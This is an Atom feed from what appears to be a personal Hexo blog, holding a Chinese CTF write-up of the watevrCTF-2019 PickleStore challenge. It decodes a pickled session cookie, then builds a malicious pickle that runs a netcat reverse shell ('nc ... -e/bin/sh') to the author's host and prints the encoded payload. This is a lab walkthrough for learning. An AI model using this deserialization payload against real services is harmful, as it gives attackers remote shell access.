@@ -1,0 +1,175 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>http://odiws.github.io</id>
+    <title>Hexo • Posts by &#34;shell反弹&#34; tag</title>
+    <link href="http://odiws.github.io" />
+    <updated>2024-09-27T11:52:27.000Z</updated>
+    <category term="buuctf" />
+    <category term="system_file" />
+    <category term="sql文件读取" />
+    <category term="文件内无字符rce" />
+    <category term="文件上传" />
+    <category term="php绕过open_basedir设置" />
+    <category term="无字母rce" />
+    <category term="ctf" />
+    <category term="php原生类利用" />
+    <category term="php反序列化" />
+    <category term="md5()和sha1()对类进行hash 触发__toString方法" />
+    <category term="http" />
+    <category term="cms框架" />
+    <category term="python" />
+    <category term="mongodb注入" />
+    <category term="条件竞争：利用session.upload_progress" />
+    <category term="preg_match绕过" />
+    <category term="$_server query_string 绕过" />
+    <category term="$_request绕过" />
+    <category term="file_get_cotents绕过" />
+    <category term="sha1函数比较数组绕过" />
+    <category term="create_function运用" />
+    <category term="buuctf， 反序列化" />
+    <category term="regexp注入" />
+    <category term="ECB加密" />
+    <category term="php7 segment fault特性" />
+    <category term="json数据爬虫" />
+    <category term="phar反序列化" />
+    <category term="js" />
+    <category term="CRLF Injection" />
+    <category term="soap" />
+    <category term="pickle反序列化" />
+    <category term="thinkphpV6.0.0" />
+    <category term="buuctf， 伪随机数" />
+    <category term="zip加密" />
+    <category term="xxe" />
+    <category term="xml_upload" />
+    <category term="flask的session伪造" />
+    <category term="二次渲染" />
+    <category term="buuctf，Perl后端文件上传" />
+    <category term="buuctf，xxe漏洞" />
+    <category term="java" />
+    <category term="flask" />
+    <category term="ctf工具安装教程" />
+    <category term="sql注入" />
+    <category term="php绕过open_opedir设置" />
+    <category term="TOTP" />
+    <category term="rce" />
+    <category term="ssti" />
+    <category term="insert截断" />
+    <category term="xss攻击" />
+    <category term="c的预处理" />
+    <category term="图片类" />
+    <category term="爬虫" />
+    <category term="js原型链污染" />
+    <category term="反序列化字符串逃逸" />
+    <category term="sql injection" />
+    <category term="文件上传(头像上传)" />
+    <category term="session反序列化" />
+    <category term="ssrf" />
+    <category term="HTTP走私攻击" />
+    <category term="json数据unicode转码绕过" />
+    <category term="对sqlite的sql注入" />
+    <category term="未理解" />
+    <category term="命令执行" />
+    <category term="zip软链接" />
+    <category term="python_seed函数" />
+    <category term="session伪造" />
+    <category term="js-vm沙箱逃逸" />
+    <category term="willphp2.2" />
+    <category term="ssti-smarty3.1.39" />
+    <category term="./htaccess文件上传" />
+    <category term="php未解析" />
+    <category term="利用环境变量构造bash命令" />
+    <category term="利用.htaccess构成后门" />
+    <category term="通过php_value来设置preg_macth正则回溯次数" />
+    <category term="java反序列化" />
+    <category term="伪随机数" />
+    <category term="mysql" />
+    <category term="信息搜集（js，网络）" />
+    <category term="异或" />
+    <category term="密码爆破" />
+    <category term="sqlmap使用" />
+    <category term="SQL注入" />
+    <category term="文件包含" />
+    <category term="php伪协议" />
+    <category term="pearcmd文件包含" />
+    <category term="xpath注入" />
+    <category term="Padding oracle attack 与CBC翻转字节攻击" />
+    <category term="php" />
+    <category term="sql盲注" />
+    <category term="php7.4" />
+    <category term="FFI预处理" />
+    <category term="thinkphp3.2.4" />
+    <category term="jwt" />
+    <category term="sql二次注入" />
+    <category term="MD5碰撞" />
+    <category term="jwt密码爆破" />
+    <category term="cms" />
+    <category term="create_function()函数" />
+    <category term="sqlע��" />
+    <category term="jwt身份验证" />
+    <category term="rc4" />
+    <category term="CRLF" />
+    <category term="任意文件读取" />
+    <category term="PDO堆叠注入" />
+    <category term="test" />
+    <category term="tag2" />
+    <category term="shell反弹" />
+    <category term="phpexit绕过" />
+    <category term="require_once函数" />
+    <entry>
+        <id>http://odiws.github.io/2024/09/27/watevrCTF-2019-PickleStore/</id>
+        <title>[watevrCTF-2019]PickleStore</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/09/27/watevrCTF-2019-PickleStore/"/>
+        <content type="html">&lt;h2 id=&#34;watevrctf-2019picklestore&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#watevrctf-2019picklestore&#34;&gt;#&lt;/a&gt; [watevrCTF-2019]PickleStore&lt;/h2&gt;
+&lt;p&gt;题目名字的描述就是 pickle，感觉就是 pickle 反序列化，F12cookie 是&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;session=gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;pickle：&lt;/p&gt;
+&lt;h3 id=&#34;pickledumps-obj&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pickledumps-obj&#34;&gt;#&lt;/a&gt; &lt;strong&gt;pickle.dumps( obj )&lt;/strong&gt;&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;序列化对象，并将结果数据流写入到文件对象中。参数 protocol 是序列化模式，默认值为 0，表示以文本的形式序列化。protocol 的值还可以是 1 或 2，表示以二进制的形式序列化。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;pickleloads&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pickleloads&#34;&gt;#&lt;/a&gt; pickle.loads(）&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;反序列化对象。将数据解析为一个 Python 对象&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;我们可以大概明确两点，这段信息是被序列化出来的，序列化后的信息被 base64 加密过再放到 cookie 里。&lt;/p&gt;
+&lt;p&gt;我们可以试着反推一下我们最原始的 cookie 信息，理想的情况下他至少应该保存着我们有 500 块钱的信息。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import pickle
+from base64 import *
+
+enc = &amp;quot;gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu&amp;quot;
+
+print(pickle.loads(b64decode(enc)))
+#运行后回显:&amp;#123;&#39;money&#39;: 500, &#39;history&#39;: [], &#39;anti_tamper_hmac&#39;: &#39;aa1ba4de55048cf20e0a7a63b7f8eb62&#39;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;运行结果如下，果真显示了信息。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/1/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;&#39;money&#39;: 500, &#39;history&#39;: [], &#39;anti_tamper_hmac&#39;: &#39;aa1ba4de55048cf20e0a7a63b7f8eb62&#39;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这段 json 串 &amp;quot;anti_tamper_hmac&amp;quot; 字段明显的表明了，使用了加密手段。hmac 加密，了解的不是很深刻。&lt;/p&gt;
+&lt;p&gt;本来想着要去爆破什么的，不过 md5 级别的爆破还是算了吧。&lt;/p&gt;
+&lt;p&gt;然后东哥说，这个东西可以直接 getshell，也别去碰撞了。&lt;/p&gt;
+&lt;h2 id=&#34;getshell构造&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#getshell构造&#34;&gt;#&lt;/a&gt; getshell 构造&lt;/h2&gt;
+&lt;p&gt;由于要拿 shell，所以要先用小号去 basic 里启动一个靶机。&lt;/p&gt;
+&lt;p&gt;我此时用的 ip 是随到的。&lt;/p&gt;
+&lt;h3 id=&#34;构造nc的序列化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#构造nc的序列化&#34;&gt;#&lt;/a&gt; 构造 nc 的序列化&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;import base64
+import pickle
+
+
+class A(object):
+    def __reduce__(self):
+        return (eval, (&amp;quot;__import__(&#39;os&#39;).system(&#39;nc 174.0.0.223 9999 -e/bin/sh&#39;)&amp;quot;,))
+a = A()
+print( base64.b64encode( pickle.dumps(a) ) )
+#gANjYnVpbHRpbnMKZXZhbApxAFg4AAAAX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ25jIDE3NC4wLjAuMjIzIDk5OTkgLWUvYmluL3NoJylxAYVxAlJxAy4=
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/1/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;拿到 flag&lt;/p&gt;
+&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaDN6aDEvcC8xMjY5ODg5Ny5odG1s&#34;&gt;https://www.cnblogs.com/h3zh1/p/12698897.html&lt;/span&gt;&lt;/p&gt;
+</content>
+        <category term="buuctf" />
+        <category term="shell反弹" />
+        <updated>2024-09-27T11:52:27.000Z</updated>
+    </entry>
+</feed>
